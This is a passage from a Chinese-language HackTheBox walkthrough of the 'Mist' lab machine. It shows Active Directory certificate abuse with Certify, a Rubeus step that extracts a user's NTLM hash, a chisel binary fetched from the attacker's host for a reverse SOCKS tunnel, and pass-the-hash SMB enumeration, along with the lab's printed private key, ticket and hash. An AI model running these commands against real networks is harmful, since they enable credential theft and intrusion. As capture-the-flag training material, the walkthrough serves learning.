        : 2/15/2024 7:07:23 AM</span><br><span class="line">    Cert End Date                 : 2/15/2123 7:17:23 AM</span><br><span class="line">    Cert Chain                    : CN=mist-DC01-CA,DC=mist,DC=htb</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br></pre></td></tr></table></figure>

<p>第一个可用的模板名为User：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">CA Name                               : DC01.mist.htb\mist-DC01-CA</span><br><span class="line">Template Name                         : User</span><br><span class="line">Schema Version                        : 1</span><br><span class="line">Validity Period                       : 1 year</span><br><span class="line">Renewal Period                        : 6 weeks</span><br><span class="line">msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH</span><br><span class="line">mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT</span><br><span class="line">Authorized Signatures Required        : 0</span><br><span class="line">pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email</span><br><span class="line">mspki-certificate-application-policy  : &lt;null&gt;</span><br><span class="line">Permissions</span><br><span class="line">  Enrollment Permissions</span><br><span class="line">    Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512</span><br><span class="line">                                  MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513</span><br><span class="line">                                  MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519</span><br><span class="line">  Object Control Permissions</span><br><span class="line">    Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519</span><br><span class="line">    WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512</span><br><span class="line">                                  MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519</span><br><span class="line">    WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512</span><br><span class="line">                                  MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519</span><br><span class="line">    WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512</span><br><span class="line">                                  MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519</span><br></pre></td></tr></table></figure>

<p>使用该模板获取证书：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\files&gt; .\Certify.exe request /ca:DC01\mist-DC01-CA /template:User</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Request a Certificates</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Current user context    : MIST\Brandon.Keywarp</span></span><br><span class="line"><span class="string">[*] No subject name specified, using current context as subject.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Template                : User</span></span><br><span class="line"><span class="string">[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Certificate Authority   : DC01\mist-DC01-CA</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] CA Response             : The certificate had been issued.</span></span><br><span class="line"><span class="string">[*] Request ID              : 61</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] cert.pem         :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIIEpQIBAAKCAQEAzJpOBcCAh3agazJu4VIwkfi9usHZ2i1ajPAvm3j+SOAFGzAE</span></span><br><span class="line"><span class="string">0YOnyEXMLaSMr/YE2Amnjgcdx8Zf6Zu5h2EfAvuF+GpjopqWCJNj+H+0Yg+4UwSX</span></span><br><span class="line"><span class="string">nLCOhCSTsaUXUiBsD8va27uhkHV/QFRsjvD6wLxk3r6F61iysUNooCZuOTx/Gc51</span></span><br><span class="line"><span class="string">6QQlGbR3Htb447C50jme4gvwz8fvB7XujY8TZDuaa1IvCAacgGz40fCnzlHx/PRV</span></span><br><span class="line"><span class="string">SPazon4VUPLc3LQP2hHf6p0uBdv4N8Q17jz2uCQUrfrhrGYOSllATqm9AzAFolEo</span></span><br><span class="line"><span class="string">3EtPz2tS5Yx5UDp4GJCepdShEqIfVvRnZa0M3QIDAQABAoIBAQC8jyCEsIpDTZI9</span></span><br><span class="line"><span class="string">+LazNTnJ7UF9khWhutaOuPRHBlTi+IH8Ml7eb8T7D0hCcDmwGL0SFKO0gt5xNGNE</span></span><br><span class="line"><span class="string">Od3b5CfeactnyzSTsH/A24TwiVDGZtJqv/qxzw0ov0TWHN3HNFYioK7MfrlBFuf1</span></span><br><span class="line"><span class="string">c1iwy2lsorMbjN6CrLXSI9uSbJh8aZrr7CH84ewFxivvkBTkPaJzdfgVetMcwkW0</span></span><br><span class="line"><span class="string">y/PgxicsB8l/Xg0P9vqjcwfxcV+ydCOQCgZVeSHkPHOZR6Yd1g1B0EG5W4uB66XW</span></span><br><span class="line"><span class="string">+pftEOjKftBobJ5InZ/3f1KG7KC2vpScaKRrBpbwp775SagDZRbxBXNe7Kz7nUdE</span></span><br><span class="line"><span class="string">eD4QN13JAoGBAND72JrdZM3WOlP352jduYiSArMYjE4US7YCm7OXeEW5q2AdwF0u</span></span><br><span class="line"><span class="string">bF08yjLqd9Tkq0Z189Py8zZOHo3hqKpe2X4PCNBfah5o6NhNazlmOe3Ru3+JSl0r</span></span><br><span class="line"><span class="string">cSEczzlXz2R5Kg9TYx9Yc2j/7wg+2zdCeucPyse/6ClXDG+i1AG8Rb8DAoGBAPqi</span></span><br><span class="line"><span class="string">I6y9OgBzbDpFMMQ7fwsiFcthqKDgrUlGRHOv3ViHZXRMZtSdDOfluleMGaWJFs4Y</span></span><br><span class="line"><span class="string">ocFMQBHTXf7RoskW6mZswU//LYNnciEvMDUvagPkgLri+H5gxy57ELYXd8i8e2PC</span></span><br><span class="line"><span class="string">remxgVeRT8El7ljTxMuk/LfyV6tmQvaKEt+2jc6fAoGBALwORQZmv3Uyl95DsKt/</span></span><br><span class="line"><span class="string">CpvIuEEtj+QbA15Pzoi3fvVPdNXTL+0p/z2PnGxg7WBYPX/0WGubrhxqA7itHbfi</span></span><br><span class="line"><span class="string">DlkPcmD/22BuC0nJsPk/8lT9bHoBszdQBkdDw33YdLn3BlAwO3xTfdc4p4KF/YIm</span></span><br><span class="line"><span class="string">gq42WcWR/Xpl6Lz0i07ceu69AoGALmV9fSi6aAL18gOE946cAg+ZQUEe2kk9Suc7</span></span><br><span class="line"><span class="string">HL9dllnaKiFKl+lKzlL0n+hLhx1Nn3Fn4EShR6t9JwLfw6H+Wl+fmZN/dWfc9M+r</span></span><br><span class="line"><span class="string">eO0CDx5pxi7mGV8JAE2/1jWZ8wsRPHJ5h11YuEEqJnNDICZzs88jCVpPaGdR1hnR</span></span><br><span class="line"><span class="string">TKCat7kCgYEApszz3TIexyUSnvI6JAp+BUf2ShbeKPuS1jNu4EYpmL4/KT0D8axr</span></span><br><span class="line"><span class="string">22PxmJNv9l5uIcVnww3qjWF3kLVjr7zD823qrQpfZULgfVAUetaU0o5FoVwdOT0D</span></span><br><span class="line"><span class="string">UrUVfDdBMFz6ZKJR/HiUwjyc9BwV8L72GPEZgFKm3G2AtPj8cemsdh8=</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">-----BEGIN CERTIFICATE-----</span></span><br><span class="line"><span class="string">MIIGDzCCBPegAwIBAgITIwAAAD2XA2Tis5gK5QAAAAAAPTANBgkqhkiG9w0BAQsF</span></span><br><span class="line"><span class="string">ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV</span></span><br><span class="line"><span class="string">MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI0MTAyNzA0NTU0NloXDTI1MTAyNzA0</span></span><br><span class="line"><span class="string">NTU0NlowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p</span></span><br><span class="line"><span class="string">c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi</span></span><br><span class="line"><span class="string">MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDMmk4FwICHdqBrMm7hUjCR+L26</span></span><br><span class="line"><span class="string">wdnaLVqM8C+beP5I4AUbMATRg6fIRcwtpIyv9gTYCaeOBx3Hxl/pm7mHYR8C+4X4</span></span><br><span class="line"><span class="string">amOimpYIk2P4f7RiD7hTBJecsI6EJJOxpRdSIGwPy9rbu6GQdX9AVGyO8PrAvGTe</span></span><br><span class="line"><span class="string">voXrWLKxQ2igJm45PH8ZznXpBCUZtHce1vjjsLnSOZ7iC/DPx+8Hte6NjxNkO5pr</span></span><br><span class="line"><span class="string">Ui8IBpyAbPjR8KfOUfH89FVI9rOifhVQ8tzctA/aEd/qnS4F2/g3xDXuPPa4JBSt</span></span><br><span class="line"><span class="string">+uGsZg5KWUBOqb0DMAWiUSjcS0/Pa1LljHlQOngYkJ6l1KESoh9W9GdlrQzdAgMB</span></span><br><span class="line"><span class="string">AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK</span></span><br><span class="line"><span class="string">KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE</span></span><br><span class="line"><span class="string">BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw</span></span><br><span class="line"><span class="string">BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM/E4P91WDE9wzoMyhYA3iFg</span></span><br><span class="line"><span class="string">v751MB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww</span></span><br><span class="line"><span class="string">gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO</span></span><br><span class="line"><span class="string">PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D</span></span><br><span class="line"><span class="string">b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv</span></span><br><span class="line"><span class="string">bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI</span></span><br><span class="line"><span class="string">KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD</span></span><br><span class="line"><span class="string">MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp</span></span><br><span class="line"><span class="string">Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0</span></span><br><span class="line"><span class="string">ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R</span></span><br><span class="line"><span class="string">BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP</span></span><br><span class="line"><span class="string">BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw</span></span><br><span class="line"><span class="string">OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC</span></span><br><span class="line"><span class="string">AQEAHZSz7ubUjAP7IYDKiJHLmkWPuX+Gh80mxJuY+cF8VQLp6vtIkTEZyCRQstP5</span></span><br><span class="line"><span class="string">+h4SLaJgFbseR1R+lpDQrwVJYB21cfRlpBFuiaCPY0MahzHsqh61apGahDS00D5N</span></span><br><span class="line"><span class="string">IAPiLSPaZvFEN61H1cvnHsST+QOFufEh/QfacjPi+NCn6Q7QSUISpz77Ymd/CEHB</span></span><br><span class="line"><span class="string">FP3h7D10VUQE0WfAZ3tUzzjzR3fSSx+KNNJ9rw/B+fe50VSimHuhDu7JR825xPWw</span></span><br><span class="line"><span class="string">t5GLD8iUH3rOXVWoycRrh9Zj2Smyw3OJwZY/OtBK1TBJGb7sjYt8IM2iPsUYItx6</span></span><br><span class="line"><span class="string">qWuZ2Ot4CNLD+9k4l8EnUSCBYA==</span></span><br><span class="line"><span class="string">-----END CERTIFICATE-----</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Certify completed in 00:00:16.2525062</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;12:53&#125;[system: ruby 3.1.2p20]~/hackthebox/machine/mist ➭ openssl pkcs12 -<span class="keyword">in</span> cert.pem -keyex -CSP <span class="string">&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;</span> -<span class="built_in">export</span> -out cert.pfx</span><br><span class="line">Enter Export Password:</span><br><span class="line">Verifying - Enter Export Password:</span><br></pre></td></tr></table></figure>

<h3 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h3><p>现在Rubues可以使用它来获取用户的NTLM hash：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">copy \\10.10.14.22\share\cert.pfx cert.pfx</span><br><span class="line"></span><br><span class="line">PS C:\xampp\htdocs\files&gt; .\Rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\files\cert.pfx /getcredentials /show /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.3.2</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Got domain: mist.htb</span><br><span class="line">[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb</span><br><span class="line">[*] Building AS-REQ (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;mist.htb\brandon.keywarp&#x27;</span></span><br><span class="line">[*] Using domain controller: 192.168.100.100:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      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</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/mist.htb</span><br><span class="line">  ServiceRealm             :  MIST.HTB</span><br><span class="line">  UserName                 :  brandon.keywarp (NT_PRINCIPAL)</span><br><span class="line">  UserRealm                :  MIST.HTB</span><br><span class="line">  StartTime                :  10/26/2024 10:16:47 PM</span><br><span class="line">  EndTime                  :  10/27/2024 8:16:47 AM</span><br><span class="line">  RenewTill                :  11/2/2024 10:16:47 PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  yM37+B9tChpECTHSyael8w==</span><br><span class="line">  ASREP (key)              :  D3434540396EA9BE4D8AB361AA8CA14E</span><br><span class="line"></span><br><span class="line">[*] Getting credentials using U2U</span><br><span class="line"></span><br><span class="line">  CredentialInfo         :</span><br><span class="line">    Version              : 0</span><br><span class="line">    EncryptionType       : rc4_hmac</span><br><span class="line">    CredentialData       :</span><br><span class="line">      CredentialCount    : 1</span><br><span class="line">       NTLM              : DB03D6A77A2205BC1D07082740626CC9</span><br></pre></td></tr></table></figure>

<h2 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h2><p>考虑到防火墙在80之前封锁了一切，使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pwaWxsb3JhL2NoaXNlbA==">Chisel<i class="fa fa-external-link-alt"></i></span>创建一个隧道。上传二进制文件，并在主机上启动服务器。从Mist连接到它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri http://10.10.14.22/chisel.exe -OutFile chisel.exe</span><br><span class="line"></span><br><span class="line">PS C:\xampp\htdocs\files&gt; .\chisel.exe client 10.10.14.22:8000 R:socks</span><br><span class="line"></span><br><span class="line">root@kali: ~/hackthebox/machine/mist <span class="comment"># ./chisel server -p 8000 --reverse                                                                                       [13:20:59]</span></span><br><span class="line">2024/10/27 13:21:34 server: Reverse tunnelling enabled</span><br><span class="line">2024/10/27 13:21:34 server: Fingerprint 85:a3:f8:c5:3d:55:2d:cb:d3:e2:48:62:8f:57:b6:e8</span><br><span class="line">2024/10/27 13:21:34 server: Listening on http://0.0.0.0:8000</span><br><span class="line">2024/10/27 13:30:49 server: session<span class="comment">#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root•hackthebox/machine/mist» proxychains -q netexec smb localhost                                                                                             [13:31:39]</span><br><span class="line">SMB         127.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)</span><br></pre></td></tr></table></figure>

<h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root•hackthebox/machine/mist» proxychains -q netexec smb localhost -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares                             [13:32:02]</span><br><span class="line">SMB         127.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         127.0.0.1       445    MS01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9</span><br><span class="line">SMB         127.0.0.1       445    MS01             [*] Enumerated shares</span><br><span class="line">SMB         127.0.0.1       445    MS01             Share           Permissions     Remark</span><br><span class="line">SMB         127.0.0.1       445    MS01             -----           -----------     ------</span><br><span class="line">SMB         127.0.0.1       445    MS01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         127.0.0.1       445    MS01             C$                              Default share</span><br><span class="line">SMB         127.0.0.1       445    MS01             Common Applications READ,WRITE</span><br><span class="line">SMB         127.0.0.1       445    MS01             IPC$            READ            Remote IPC</span><br><span class="line"></span><br><span class="line">root•hackthebox/machine/mist» proxychains -q netexec smb 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares                       [13:33:39]</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.100.100 445    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9</span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Enumerated shares</span><br><span class="line">SMB         192.168.100.100 445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         192.168.100.100 445    DC01             -----           -----------     ------</span><br><span class="line">SMB         192.168.100.100 445    DC01             ADMIN$                          Remote 